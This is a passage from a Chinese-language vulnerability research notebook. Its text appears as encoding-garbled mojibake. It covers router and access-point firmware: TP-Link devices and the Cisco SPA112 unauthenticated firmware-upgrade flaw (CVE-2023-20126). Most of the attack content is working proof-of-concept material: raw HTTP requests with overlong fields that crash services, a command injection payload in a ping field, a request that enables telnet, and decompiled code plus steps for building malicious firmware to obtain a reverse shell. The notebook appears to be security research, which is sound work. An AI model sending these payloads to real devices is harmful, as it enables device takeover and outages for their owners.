Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"setPing":{"ip":"192.168.0.111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","times":4,"sig":"anacax"}}
```

bug9
4276E4

```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 593
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"spdtstConfigAndStart":{"mode":0,"time_sec":0,"ip":"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111",
"txrate":0,
"sig":"aaaa"}}
```



bug10å‘½ä»¤æ³¨å…¥

```http
POST /goform/modules?0.13346464962467874 HTTP/1.1
Host: 192.168.0.254
Content-Length: 77
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"pingSet":{"pingIp":"www.$(touch /flag).com","pingNum":"4","pingSize":"64"}}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231210111613.png)


## TL-XAP3007GC-PoE/DC

### ç‰ˆæœ¬ä¿¡æ¯
V1.0 20220530_1.0.12
https://resource.tp-link.com.cn/pc/docCenter/showDoc?productId=1875&type=UPGRADE_SOFT&id=1657242724588266

v2.0 20230831_1.0.5
https://resource.tp-link.com.cn/pc/docCenter/showDoc?productId=1875&type=UPGRADE_SOFT&id=1699233938075326

### æ¼æ´åˆ†æ
binwalkè§£å‹å›ºä»¶ï¼Œarmhfå°ç«¯åºï¼Œç”¨muslè¿›è¡Œç¼–è¯‘çš„ï¼Œè§‚å¯Ÿæ–‡ä»¶ç³»ç»Ÿå‘ç°æ˜¯OpenWrté­”æ”¹

```shell
./sbin/psh: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-arm.so.1, stripped
```

ä¸»è¦çš„æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ä¸º./bin/dmsï¼ŒæŸ¥é˜…èµ„æ–™è¯´æ˜¯è®¾å¤‡ç®¡ç†æœåŠ¡

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231225133045.png)

å…¶ä¸­æœ‰å‡ ä¸ªå€¼å¾—æ³¨æ„çš„å‡½æ•°

commandAddï¼Œç”¨äºæ³¨å†Œcmdå‘½ä»¤

```c
.data:003D6568 00                            unk_3D6568 DCB    0                     ; DATA XREF: sub_1C5780+20â†‘o
.data:003D6568                                                                       ; sub_1C5780+30â†‘o
.data:003D6568                                                                       ; .text:off_1C5C2Câ†‘o
.data:003D6568                                                                       ; lanInit+908â†‘o
.data:003D6568                                                                       ; lanInit+90Câ†‘o
.data:003D6568                                                                       ; .text:off_1C97B8â†‘o
.data:003D6569 00                            DCB    0
.data:003D656A 00                            DCB    0
.data:003D656B 00                            DCB    0
.data:003D656C 00                            DCB    0
.data:003D656D 00                            DCB    0
.data:003D656E 00                            DCB    0
.data:003D656F 00                            DCB    0
.data:003D6570 F7 F7 33 00                   DCD aNetworkInterfa_0+0x13              ; "lanv6"
.data:003D6574 9B F6 35 00                   DCD aLanv6DebugComm                     ; "lanv6 debug command."
.data:003D6578 80 57 1C 00                   DCD sub_1C5780
.data:003D657C B0 F6 35 00                   DCD aDss                                ; "dss"
.data:003D6580 90 65 3D 00                   off_3D6580 DCD off_3D6590               ; DATA XREF: sub_1C5780+7Câ†‘r
.data:003D6580                                                                       ; sub_1C5780+120â†‘r
.data:003D6580                                                                       ; sub_1C5780+3B8â†‘r
.data:003D6580                                                                       ; "debug"
.data:003D6584 04 00 00 00                   dword_3D6584 DCD 4                      ; DATA XREF: sub_1C5780+74â†‘r
.data:003D6584                                                                       ; sub_1C5780+11Câ†‘r
.data:003D6584                                                                       ; sub_1C5780+3B4â†‘r
.data:003D6588 00                            DCB    0
.data:003D6589 00                            DCB    0
.data:003D658A 00                            DCB    0
.data:003D658B 00                            DCB    0



```


```
commandAddç”¨äºæ³¨å†Œ cmdTask å‘½ä»¤è¡ŒæŒ‡ä»¤çš„å‡½æ•°
hwSwMode  enter switch hardware mode
nmsMsg nmsMsg request
dhcpEvent Add dhcp event node.
dhcpv6Event Add dhcpv6 event node.
appManage  app manage request.
list List all supported command on DMS.
netdev DMS netdev management.
taskManage DMS tasks information.
gpio_ctrl GPIO read and write.
switch_ioctl switch ioctl test.
flash  Display flash layout info, read Flash c
mcb Show mcb pools or blocks.
msgbus msg bus
cfg80211 use NL80211 interface to send msg.
aps Cfg path selection.
wtp wtp information or debug command.
cloudClient cloudClient request.
devinfo Display hardware id, device id and othe
dhcps Handle DHCP Server request.
dhcpv6s show all dhcpv6 host.
sta_manage  Manage all stations.
http http request.
link Display link info
lldp cloudClient request.
encrypt encrypt debug commands
bh_optimize backhaul optimize commands
lan lan business commands
tp_business tp_business debug commands
pair pair debug commands
netif netif manage commands
mgt subrouter manage commands
role_switch topology role switch commands
wss wss commands
backhaul backhaul event commands
device device manage commands
station station event commands
topology  topology manage commands
event_notifier mapd event notifier
lanv6  lanv6 debug command.
smartDhcp smartDhcp debug command.
rtadvc send RS pkt.
rtadvd send pkt.
statistics statistics request.
sysmode sysmode debug command.
dhcpc Handle DHCPC request.
dhcpcv6 Handle DHCPC request.
wan_port_detect 
wlancfg Cfg wlan or display status.
wportal Config or display wportal info.
data_module Ctrl command for DMS data module mvc.
pipe write to or dump pipe list.
log_conf Configure DMS log system, set level and
```


modelReadå‡½æ•°
```
modelRead("/network/interface/lanv6", dest, 0x4Cu)
```

é¦–å…ˆä¼šæ£€æŸ¥a1æ˜¯å¦ä¸ºéç©ºï¼Œå¹¶ä¸”æ˜¯å¦ä»¥'/'å¼€å¤´ï¼Œè¿™è¡¨æ˜è·¯å¾„æˆ–é”®åçš„æ ¼å¼è¦æ±‚ã€‚é€šè¿‡å­—ç¬¦ä¸²æ“ä½œå‡½æ•°ï¼ˆå¦‚strchrå’Œmemcpyï¼‰è§£æa1ä¸­çš„è·¯å¾„æˆ–é”®åï¼Œåˆ†è§£ä¸ºä¸åŒçš„éƒ¨åˆ†ã€‚getModulerRootä¼šç”¨äºè·å–æ¨¡å—æ‰€åœ¨æ ¹ç›®å½•ï¼Œå…¶ä¸­åŠ è½½æ¨¡å—ç”¨åˆ°äº†json_object_load_from_fileå‡½æ•°ï¼Œæ¥è‡ª./usr/lib/libjson.so.0.0.1ï¼Œç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯»å–å…¶å†…å®¹ï¼Œå¹¶å°è¯•å°†å†…å®¹è§£æä¸ºJSONæ ¼å¼ã€‚å†ç”¨jsonObjectObjectGetï¼Œç”¨äºåœ¨è§£æåçš„JSONæ•°æ®ç»“æ„ä¸­è¿›è¡Œé«˜æ•ˆçš„é”®å€¼å¯¹æŸ¥æ‰¾æ“ä½œã€‚æœ€åæ ¹æ®jsonçš„å­—æ®µæ‰§è¡Œç›¸åº”çš„å‡½æ•°
```
                  v18 = v21(a1, v20, a2 + v18, a3 - v18);
```

è¿™ä¸ªå‡½æ•°ä¼¼ä¹æ˜¯æ‰§è¡Œå‡½æ•°åŠŸèƒ½çš„ä¸»è¦é€»è¾‘ï¼Œç”¨äºæå–jsonåˆ°a2å‚æ•°ä¸­ï¼Œconf/templateä¼¼ä¹å°±æ˜¯å®ƒçš„æ¨¡å—æ ¹ç›®å½•ï¼Œå…¶ä¸­ä¼¼ä¹é™åˆ¶äº†æ¯ä¸ªå­—æ®µçš„å¤§å°


registerActionå‡½æ•°
```
registerAction("plugin_config", "get_plugins", getPluginsReqHandle);
```

æ ¡éªŒå¯¹åº”çš„æ•°æ®æ¨¡å—ä¸­ï¼Œ"get_plugins"å­—æ®µæ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™åˆ†é…ä¸€ä¸ªå†…å­˜ï¼Œè®¾ç½®åŠ¨ä½œå¯¹åº”å‡½æ•°"get_plugins"  -ã€‹ getPluginsReqHandle
ä¸»è¦çš„ä½œç”¨æ˜¯åœ¨ä¸€ä¸ªæ•°æ®æ¨¡å—ä¸­æ³¨å†Œä¸€ä¸ªæ–°çš„åŠ¨ä½œæˆ–äº‹ä»¶

registerAppModuleå‡½æ•°
```
registerAppModule(&uhttpdService);
```

ä¸»è¦ç›®çš„æ˜¯åœ¨ç³»ç»Ÿä¸­æ³¨å†Œæˆ–æ›´æ–°ä¸€ä¸ªåº”ç”¨æ¨¡å—ã€‚å®ƒé¦–å…ˆéªŒè¯è¾“å…¥å‚æ•°çš„æœ‰æ•ˆæ€§ï¼Œç„¶åæŸ¥æ‰¾ç³»ç»Ÿä¸­æ˜¯å¦å·²å­˜åœ¨åŒ¹é…çš„æ¨¡å—ã€‚ä¸»è¦ç”¨äºæ›´æ–°æ“ä½œæ¥å£ã€‚


å¤„ç†çš„æ•°æ®æ˜¯ json æ ¼å¼ï¼ŒåŸºæœ¬å‚æ•°åŒ…æ‹¬ methodã€request
å‡½æ•°æ ¹æ®ä¸åŒçš„ method ä¼šåšä¸åŒçš„å¤„ç†ï¼Œå…·ä½“åŒ…å« getã€addã€deleteã€setã€do
å¤„ç†é€»è¾‘ç±»ä¼¼äº switch case ç»“æ„ï¼Œæ ¹æ®ä¸åŒçš„ request è°ƒç”¨ä¸åŒçš„ handler

```
{
	"system":{
		"firmware_upgrade":{
			"type":"0"
		}
	},
	"method":"do"
}
```

å…¶ä¸­ä¸€äº›ä¸éœ€è¦é‰´æƒçš„æ¥å£
httpReqOpenSysInfo # device_info capability account_info_status
httpReqRoleInfo
httpProcDataSrv
httpProcDsMethod   internMethodOpr
getPluginStatusReqHandle 


ç”±äºåœ¨FAPæ¨¡å¼ä¸‹é»˜è®¤åœ¨1900ç«¯å£å¼€å¯äº†æœåŠ¡ï¼Œå¯ä»¥åˆ†æminiUPnPSSDPHandleå‡½æ•°

### åˆ©ç”¨åˆ†æ

POC

```http
POST /stok=vzXv4LEE50E5Ov0yvrBmVddEtVfPfmDb/ds HTTP/1.1
Host: 192.168.1.254
Content-Length: 1025
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.254
Referer: http://192.168.1.254/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"method":"set","cloud_config":{"conf_mngt":{"mngt_switch":"1"},"cloud_type":{"cloud_type":"user_define"},"tums_info":{"server":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.telnetdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com","port":"60443"}}}
```

ä¼šå¯¼è‡´APæœåŠ¡å´©æºƒï¼Œé‡ç½®æ— æ³•æ¢å¤

POC2

åœ¨å¼€å¯telnetçš„æƒ…å†µä¸‹å†æ¬¡å‘åŒ…ä¼šå¯¼è‡´æ‰€æœ‰è¿æ¥è®¾å¤‡é€€å‡º
```HTTP
POST /stok=vzXv4LEE50E5Ov0yvrBmVddEtVfPfmDb/ds HTTP/1.1
Host: 192.168.1.254
Content-Length: 1025
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.254
Referer: http://192.168.1.254/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"method":"set","telnet":{"rule":{"enable":"1"}}}
```




å‚è€ƒæ–‡ç« ï¼šhttps://mp.weixin.qq.com/s/98YDkBrg0XZe32NLNnn5JQ?ref=www.ctfiot.com




# æ¼æ´å¤ç°

## 1.CVE-2023-20126 Cisco SPA112

### æ¼æ´æè¿°

Cisco SPA112 2 ç«¯å£ç”µè¯é€‚é…å™¨åŸºäº Web çš„ç®¡ç†ç•Œé¢ä¸­å­˜åœ¨æ¼æ´ï¼Œå¯èƒ½å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…åœ¨å—å½±å“çš„è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºå›ºä»¶å‡çº§åŠŸèƒ½ä¸­ç¼ºå°‘èº«ä»½éªŒè¯è¿‡ç¨‹é€ æˆçš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å°†å—å½±å“çš„è®¾å¤‡å‡çº§åˆ°ç²¾å¿ƒè®¾è®¡çš„å›ºä»¶ç‰ˆæœ¬æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…ä»¥å®Œå…¨æƒé™åœ¨å—å½±å“çš„è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚æ€ç§‘å°šæœªå‘å¸ƒå›ºä»¶æ›´æ–°æ¥è§£å†³æ­¤æ¼æ´ã€‚

### å½±å“èŒƒå›´åŠç‰ˆæœ¬

Cisco SPA112 1.4.1 SR5 (å·²åœæ­¢ç»´æŠ¤)
### æ¼æ´åˆ†æ

å›ºä»¶ä¸‹è½½ï¼šhttps://software.cisco.com/download/home/283998771/type/282463187/release/1.4.1%20SR5


ç”±äºç¯å¢ƒæ­å»ºä¸èµ·æ¥ï¼Œä¼¼ä¹æ˜¯å› ä¸ºç¼ºå°‘nvram
```shell
# /usr/sbin/httpd 
[nv_get_config_data] fopen() failed!: /nvram/nvram.data
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 1
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 2
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 3
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 4
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 5
httpd:No LAN IP address and protocol specified.
: File exists
httpd : Something error occur, retry 6
httpd:No LAN IP address and protocol specified.
: File exists
```

ç”±äºæ¼æ´ç‚¹æ¯”è¾ƒç®€å•å…ˆåˆ†æhttpdï¼Œä¸»è¦æ˜¯cgiå’Œaspçš„æ–¹å¼ï¼Œmainå‡½æ•°æ¯”è¾ƒé•¿ï¼Œç”¨äº†å‡ ä¸ªnvramå‡½æ•°å‡½æ•°å»è·å–å‚æ•°å’ŒåŒ¹é…å­—æ®µï¼Œè¿™äº›å‡½æ•°éƒ½åœ¨usr/lib/libnvram.soä¸­


```c
            "Usage: %s [-S] [-p port]\n"
            "\t-S : Support https (port 443)\n"
            "\t-p port : Which port to listen?\n"
            "\t-t secs : How many seconds to wait before timing out?\n"
            "\t-s ciphers: set cipher lists\n"
            "\t-g: get cipher lists\n",
```

```
nvram_match   åŒ¹é…æˆåŠŸè¿”å›1,å¦åˆ™è¿”å›ç¬¬ä¸€ä¸ªå‚æ•°é‡Œçš„å€¼
nvram_get_ex   
nvram_invmatch
```

```c
bool __fastcall nvram_match(int a1, const char *a2)
{
  const char *v3; // r0
  const char *v4; // r3
  int v6; // [sp+0h] [bp-48h] BYREF

  v3 = j_nvram_get_ex(a1, &v6);
  v4 = v3;
  if ( v3 )
    return strcmp(v3, a2) == 0;
  return v4;
}


int __fastcall nvram_invmatch(char *a1, const char *a2)
{
  const char *v3; // r0
  int v4; // r2
  int v6; // [sp+0h] [bp-48h] BYREF

  v3 = j_nvram_get_ex(a1, &v6, 0x40u);
  if ( !a2 )
    a2 = "";
  v4 = -1;
  if ( v3 )
    return strcmp(v3, a2);
  return v4;
```

ä»900è¡Œå¼€å§‹ï¼Œä¾¿è¿›å…¥äº†å¤„ç†æŠ¥æ–‡çš„éƒ¨åˆ†ã€‚ä¼šå‘ç°åœ¨æ¯”å¯¹urlæ—¶å¼•ç”¨aQuickSetup_ptrå’ŒaGetconnstAsp_ptrçš„å­—æ®µ

```c
        if ( !v49 )
        {
LABEL_294:
          if ( strcasecmp(s, "get") && strcasecmp(s, "post") )
          {
            sub_119FC(501, "Not Implemented", 0, "The server does not support the action requested by the browser.");
            goto LABEL_114;
          }
          if ( *v182 == 47 )
          {
            v40 = (v182 + 1);
            v103 = *(v182 + 1);
            v104 = strlen(v182 + 1);
            if ( v103 != 47 && (v103 != 46 || v182[2] != 46 || v182[3]) )
            {
              if ( strncmp(v40, "../", 3u) )
              {
                if ( !strstr(v40, "/../") )
                {
                  v105 = &v40[v104];
                  if ( (v40[v104 - 3] != asc_46F7C[0]
                     || v40[v104 - 2] != asc_46F7C[1]
                     || v40[v104 - 1] != asc_46F7C[2]
                     || v40[v104] != asc_46F7C[3])
                    && (*(v105 - 1) != 47 || *v105 || v104 <= 0) )
                  {
                    if ( !v103 || *(v105 - 1) == 47 )
                    {
                      if ( !nvram_invmatch("close_authip", &nptr)
                        || (memset(v174, 0, sizeof(v174)),
                            nvram_get_ex("http_client_ip", v174, 32),
                            nvram_get_ex("auth_ip", v175, 16))
                        && nvram_invmatch("auth_ip", v174) )
                      {
                        v40 = "login.asp";
                      }
                      else
                      {
                        v40 = "index.asp";
                      }
                    }
                    if ( nvram_get_ex("close_session", v175, 16)
                      && nvram_invmatch("close_session", &nptr)
                      && (strstr(v40, ".asp") || strstr(v40, ".cgi") || strchr(v40, 59)) )
                    {
                      sscanf(v40, "%[^;];%s", v172, &v172[50]);
                      v40 = v172;
                    }
                    if ( nvram_match("http_power", &nptr) && aQuickSetup_ptr )
                    {
                      v106 = &off_5D744;
                      while ( 1 )
                      {
                        if ( !strcmp(v40, v106[5]) )
                        {
                          v107 = v106[3];
                          if ( *v107 == 48 && !v107[1] )
                            break;
                          if ( !*v107 )
                            break;
                        }
                        v106 += 11;
                        if ( !v106[6] )
                          goto LABEL_321;
                      }
                      sub_119FC(
                        401,
                        "Bad Request",
                        0,
                        "The server could not verify that you are authorized to access the requested URL.");
                    }
                    else
                    {
LABEL_321:
                      v108 = aGetconnstAsp_ptr[0];
                      if ( !aGetconnstAsp_ptr[0] )
                        goto LABEL_113;
                      v109 = aGetconnstAsp_ptr;
                      while ( 2 )
                      {
                        for ( nn = v108; ; nn = v111 + 1 )
                        {
                          v111 = strchr(nn, 124);
                          if ( !v111 )
                            break;
                          if ( sub_10F04(nn, v111 - nn, v40) )
                            goto LABEL_98;
                        }
                        v112 = strlen(nn);
                        if ( !sub_10F04(nn, v112, v40) )
                        {
                          v113 = v109[6];
                          v109 += 6;
                          v108 = v113;
                          if ( v113 )
                            continue;
                          goto LABEL_113;
                        }
                        break;
                      }
LABEL_98:
                      v37 = v109[5];
                      if ( v37 )
                      {
                        (v37)(&off_625F4, &off_62634, &off_62674);
                        dword_623D4 = 0;
                        if ( strcmp(v40, "login.asp") )
                        {
                          if ( !sub_11120(v40) )
                          {
                            v150 = dword_64EA4;
                            if ( dword_64EA4 || sub_10340() >= 0 )
                              v40 = "login.asp";
                            else
                              sub_119FC(403, "Forbidden", v150, "Can't use wireless interface to access web.");
                          }
                        }
                      }
```

å°±ä¼šå‘ç°æ˜¯é€šè¿‡æ•°ç»„å¯»å€çš„æ–¹å¼å¯»æ‰¾å¯¹åº”çš„urlå’Œå¯¹åº”çš„å‡½æ•°
è¿™é‡Œç”¨idaæ’ä»¶å¿«é€Ÿæ¢å¤dataæ®µçš„å‡½æ•°è¡¨<https://github.com/grayhatacademy/ida/tree/master/plugins/codatify>
æ¢å¤ä»¥åå°±èƒ½å¾ˆå¿«æŸ¥æ‰¾åˆ°upgradeå‡½æ•°ï¼Œæ¯ä¸ªå‡½æ•°éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç¬¬å››ä¸ªå‚æ•°å°±æ˜¯å‡½æ•°ï¼Œè€Œç¬¬å…­ä¸ªå‚æ•°åˆ™æ˜¯è®¿é—®æƒé™ã€‚0æ ‡å¿—ç€ä¸éœ€è¦æƒé™ï¼Œè€Œå¦‚æœæ˜¯sub_142b4çš„è¯ï¼Œåˆ™éœ€è¦é‰´æƒã€‚

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231205171652.png)

```c
int __fastcall sub_142B4(int a1, int a2, int a3)
{
  nvram_get_ex("http_username", a1, 64);
  nvram_get_ex("http_passwd", a2, 64);
  return nvram_get_ex("router_name", a3, 64);
}
```

è€Œæ¼æ´ç‚¹ä¸»è¦æ˜¯æºäºupgrade.cgiæ¥å£çš„æœªæˆæƒ

```c
int __fastcall sub_1F7AC(int a1, int a2, int a3, int a4)
{
  int v6; // r5
  int v7; // r1
  bool v8; // zf
  int v9; // r4
  int result; // r0
  int v11; // r4
  unsigned int v12; // r1
  int v13; // r0
  int v14; // r4
  int v15; // r3
  FILE *v16; // r4
  int v17; // r5
  int v18; // [sp+Ch] [bp-42Ch] BYREF
  char v19; // [sp+17h] [bp-421h] BYREF
  char v20; // [sp+18h] [bp-420h]
  char v21; // [sp+19h] [bp-41Fh]

  v18 = a3;
  dword_64EA8 = 22;
  system("cp /www/Success_u.asp /tmp/.");
  system("cp /www/Fail_r_s.asp /tmp/.");
  system("cp /www/Success_u_s.asp /tmp/.");
  system("cp /www/Fail_u_s.asp /tmp/.");
  system("cp /sbin/write /tmp/write");
  v6 = v18;
  if ( v18 > 0 )
  {
    while ( 1 )
    {
      v7 = v6 + 1;
      if ( (v6 + 1) >= 0x400 )
        v7 = 1024;
      v8 = sub_108E0(&v19, v7, a2) == 0;
      result = &v19;
      if ( v8 )
        return result;
      v9 = v18 - strlen(&v19);
      v18 = v9;
      v6 = v9;
      if ( !strncasecmp(&v19, "Content-Disposition:", 0x14u) )
      {
        if ( strstr(&v19, "name=\"file\"") )
        {
          dword_84190 = 1;
          nvram_set("submit_button", "Upgrade");
          v17 = 2;
LABEL_14:
          if ( !nvram_match("submit_button", "Upgrade")
            || (dword_5DED4 = 0x101, dword_6DD88)
            || nvram_match("remote_upgrade", &nptr)
            || !nvram_match("router_mode", &nptr) )
          {
            v11 = v18;
            while ( 1 )
            {
              v12 = v11 + 1;
              if ( v11 <= 0 )
              {
LABEL_25:
                v13 = sub_1E048(0, a2, &v18, v17, a4);
                v14 = v18;
                dword_64EA8 = v13;
                goto LABEL_26;
              }
              if ( v12 >= 0x400 )
                v12 = 1024;
              v8 = sub_108E0(&v19, v12, a2) == 0;
              result = &v19;
              if ( v8 )
                break;
              v11 = v18 - strlen(&v19);
              v18 = v11;
              if ( v19 == 10 && !v20 || v19 == 13 && v20 == 10 && !v21 )
                goto LABEL_25;
            }
          }
          else
          {
            v16 = fopen("/dev/console", "w");
            if ( v16 )
            {
              fwrite("Can't upgrade from wan side\n", 1u, 0x1Cu, v16);
              fclose(v16);
            }
            v14 = v18;
            dword_64EA8 = 'c';
LABEL_26:
            while ( 1 )
            {
              result = a2;
              v15 = a2;
              if ( v14 <= 0 )
                break;
              while ( dword_623C8 )
              {
                BIO_gets(result, &v19, 1, v15);
                result = a2;
                v15 = a2;
                if ( v18 <= 0 )
                  return result;
              }
              result = sub_10548(&v19, 1, 1025, v15);
              if ( result < 0 )
                return result;
              v14 = v18 - result;
              v18 -= result;
            }
          }
          return result;
        }
        if ( strstr(&v19, "name=\"restore\"") )
        {
          dword_623AC = 1;
          nvram_set("submit_button", "Restore");
          v17 = 1;
          goto LABEL_14;
        }
      }
      if ( v9 <= 0 )
      {
        v17 = 0;
        goto LABEL_14;
      }
    }
  }
  return printf("\n Fail: upgrade file size = %d \n", v18);
}
```

ä¸Šä¼ çš„æŠ¥æ–‡ä¸€èˆ¬å¦‚ä¸‹ï¼Œç»“åˆåˆ†æï¼Œåˆ¤æ–­å…¶ä¸­çš„ name ä¸º file è¿˜æ˜¯ restoreï¼Œå½“ name ä¸º file æ—¶ï¼Œä¼šè®¾ç½®submit_button å˜é‡ä¸º Upgradeï¼Œåœ¨åç»­çš„ if æ¡ä»¶åˆ¤æ–­ä¸­ï¼Œä¼šæ£€æŸ¥ submit_button å˜é‡ï¼Œå¦‚æœå®ƒç­‰äº Upgradeï¼Œåˆ™ç»§ç»­åˆ¤æ–­ remote_upgrade ç­‰å‚æ•°å€¼ã€‚æœ€ç»ˆä¼šè¿›å…¥sub_1E048è¿›è¡Œå‡çº§æ“ä½œ

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=boundary_string

--boundary_string
Content-Disposition: form-data; name="file"; filename="file.txt"
Content-Type: text/plain

<file_content_here>

--boundary_string--

```

å› æ­¤åªéœ€è¦æ„å»ºä¸€ä¸ªæ¶æ„çš„å›ºä»¶ï¼Œç„¶åä¸Šä¼ æ›´æ–°ï¼Œå¯åŠ¨æ—¶å°±èƒ½æ‰§è¡Œä¸€äº›åå¼¹shellçš„å‘½ä»¤
### åˆ©ç”¨åˆ†æ

https://github.com/rrrrrrri/spa112-tools


éš¾ç‚¹å°±åœ¨äºæ„å»ºå›ºä»¶ä¸Šï¼Œæ ¸å¿ƒæ€è·¯æ˜¯å°†æ–‡ä»¶ç³»ç»Ÿåˆ†ç¦»å‡ºæ¥ï¼Œè¿›è¡Œä¿®æ”¹åå†æ‰“åŒ…ç„¶åæ‹¼æ¥ä¸ŠåŸæœ¬çš„å†…å®¹å¾—åˆ°åº”è¯¥æ–°çš„img
è¿™é‡Œå…ˆç”¨ddå°†æ–‡ä»¶ç³»ç»Ÿåˆ†ç¦»å‡ºæ¥
```
dd if=Payton_1.4.1_SR5_101419_1250_pfmwr.bin of=sqfs.ori bs=1 skip=1573256

if=Payton_1.4.1_SR5_101419_1250_pfmwr.bin: è¿™è¡¨ç¤ºè¾“å…¥æ–‡ä»¶æ˜¯Payton_1.4.1_SR5_101419_1250_pfmwr.binã€‚ifä»£è¡¨input fileã€‚

of=sqfs.ori: è¿™è¡¨ç¤ºè¾“å‡ºæ–‡ä»¶æ˜¯sqfs.oriã€‚ofä»£è¡¨output fileã€‚

bs=1: è¿™è¡¨ç¤ºæ¯æ¬¡è¯»å–å’Œå†™å…¥çš„å—å¤§å°æ˜¯1å­—èŠ‚ã€‚bsä»£è¡¨block sizeã€‚

skip=1573256: è¿™è¡¨ç¤ºè·³è¿‡Payton_1.4.1_SR5_101419_1250_pfmwr.binæ–‡ä»¶çš„å‰1573256ä¸ªå­—èŠ‚ï¼Œç„¶åå¼€å§‹è¯»å–å’Œå†™å…¥ã€‚skipç”¨äºè·³è¿‡è¾“å…¥æ–‡ä»¶çš„æŒ‡å®šå­—èŠ‚æ•°ã€‚
```

ä½†æ˜¯æå–å‡ºæ¥ä»¥åæ— æ³•ç”¨unsquashfsè¿›è¡Œæå–
```shell
âœ  spa112 unsquashfs sqfs.ori
Can't find a SQUASHFS superblock on sqfs.ori
```

